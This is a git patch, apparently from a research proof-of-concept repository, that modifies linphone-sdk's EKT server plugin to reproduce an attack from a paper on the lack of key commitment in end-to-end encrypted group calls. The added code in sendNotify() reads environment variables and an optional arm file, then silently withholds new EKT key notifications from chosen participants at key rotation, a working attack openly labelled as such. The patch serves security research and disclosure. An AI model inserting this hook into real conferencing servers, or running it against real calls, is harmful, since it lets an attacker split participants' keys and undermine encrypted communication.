@@ -1,0 +1,98 @@
+Subject: [PATCH] ekt-server: add EKT_NOTIFY_BLOCKLIST hook for PoC of paper
+ "Sowing Discord: Exploiting the Lack of Key Commitment in E2EE Group RTC" (§5.1)
+
+Base: upstream linphone-sdk commit 7d5fe98a18ff7be2381656b600f880e3c49f5089
+      (master, 2025-12-23), vendored under third_party/linphone-sdk/.
+
+This patch is applied automatically by poc-linphone/scripts/build_linphone_sdk.sh
+before configuring the SDK build, and reverted after the build completes. The
+linphone-sdk source tree is otherwise untouched.
+
+What the hook does:
+  At the entry of ServerEktManager::sendNotify(), we read two environment
+  variables:
+
+    EKT_NOTIFY_BLOCKLIST            comma-separated list of substrings
+                                    matched against the remote contact URI
+                                    of the SUBSCRIBE event for which this
+                                    NOTIFY is about to be sent. A match
+                                    means the NOTIFY is silently dropped.
+
+    EKT_NOTIFY_BLOCKLIST_ARM_FILE   (optional) path to a sentinel file. The
+                                    blocklist is only consulted when this
+                                    file exists. Lets the attacker (= the
+                                    streamer) arm the blocklist at the
+                                    exact moment of key rotation, so the
+                                    initial EKT distribution to the future
+                                    target completes normally and only the
+                                    new key gets withheld. Without this
+                                    variable the blocklist is always armed
+                                    (= legacy behaviour).
+
+  The EKT plugin's protocol logic itself is otherwise unchanged.
+
+Apply / revert manually (the build script does this automatically):
+  (cd ../linphone-sdk && git apply ../poc-linphone/patches/0001-*.patch)
+  (cd ../linphone-sdk && git apply -R ../poc-linphone/patches/0001-*.patch)
+
+---
+diff --git a/ekt-server/src/server-ekt-manager.cpp b/ekt-server/src/server-ekt-manager.cpp
+index cc8b6c1cb0..3bb50e539d 100644
+--- a/ekt-server/src/server-ekt-manager.cpp
++++ b/ekt-server/src/server-ekt-manager.cpp
+@@ -20,6 +20,8 @@
+ 
+ #include "server-ekt-manager.h"
+ 
++#include <sys/stat.h>
++
+ #include "bctoolbox/logging.h"
+ 
+ #include "linphone++/buffer.hh"
+@@ -202,6 +204,46 @@ void EktServerPlugin::ServerEktManager::sendNotify(const shared_ptr<Event> &ev,
+                                                    const list<shared_ptr<const Address>> &addresses) const {
+ 	if (!ev) return;
+ 
++	// PoC hook (paper "Sowing Discord ..." §5.1, Anet's role): selectively
++	// suppress the EKT NOTIFY destined for a specific participant device so
++	// that the device retains its old inner_master_key_sender while the rest
++	// of the conference transitions to the new one. Equivalent (within the
++	// paper's Anet model) to a size-based UDP filter on full EKT-tag packets;
++	// done here for implementation simplicity. EKT_NOTIFY_BLOCKLIST is a
++	// comma-separated list of substrings matched against the remote contact
++	// URI of the SUBSCRIBE event for which this NOTIFY would be sent.
++	//
++	// EKT_NOTIFY_BLOCKLIST_ARM_FILE: if set, the blocklist is only consulted
++	// when this file exists. This lets the attacker arm the blocklist at
++	// the exact moment of key rotation, so the initial EKT distribution
++	// to the future target completes normally and only the new key gets
++	// withheld. Without this variable the blocklist is always armed.
++	if (const char *blocklist = ::getenv("EKT_NOTIFY_BLOCKLIST"); blocklist && *blocklist) {
++		bool armed = true;
++		if (const char *arm_file = ::getenv("EKT_NOTIFY_BLOCKLIST_ARM_FILE"); arm_file && *arm_file) {
++			struct stat st;
++			armed = (::stat(arm_file, &st) == 0);
++		}
++		if (armed) {
++			const auto contact = ev->getRemoteContact();
++			const string remoteUri = contact ? contact->asStringUriOnly() : string{};
++			string list_str(blocklist);
++			size_t pos = 0;
++			while (pos < list_str.size()) {
++				size_t next = list_str.find(',', pos);
++				string token = list_str.substr(pos, next == string::npos ? string::npos : next - pos);
++				if (!token.empty() && !remoteUri.empty() && remoteUri.find(token) != string::npos) {
++					bctbx_message("ServerEktManager::sendNotify : *** PoC ATTACK *** "
++					              "suppressing EKT NOTIFY destined for [%s] (matched token [%s] in EKT_NOTIFY_BLOCKLIST)",
++					              remoteUri.c_str(), token.c_str());
++					return;
++				}
++				if (next == string::npos) break;
++				pos = next + 1;
++			}
++		}
++	}
++
+ 	const shared_ptr<EktInfo> ei = Factory::get()->createEktInfo();
+ 	ei->setSspi(mSSpi);
+ 	if (!mCSpi.empty()) {
